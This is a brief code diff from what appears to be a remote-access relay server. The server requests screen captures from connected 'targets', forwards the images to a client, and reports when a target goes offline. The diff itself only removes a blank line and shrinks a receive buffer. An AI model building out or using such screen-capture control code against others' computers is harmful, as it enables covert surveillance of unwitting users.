@@ -229,7 +229,6 @@ ID: {targets_list[g]["id"]}
                         cs.send(bytes('TARGET_OFFLINE','utf-8'))
                         break
 
-
                 try:
                     ts.send(bytes('GET_SCREEN_CAPTURE','utf-8'))
                 except UnboundLocalError:
@@ -246,7 +245,7 @@ ID: {targets_list[g]["id"]}
 
                         data = b''
                         while len(data) < ss_size_unpckd:
-                            packet = ts.recv(min(ss_size_unpckd - len(data), 1024*1024*1024*5))
+                            packet = ts.recv(min(ss_size_unpckd - len(data), 1024*1024*32))
                             data += packet                        
 
                         cs.send(ss_size)
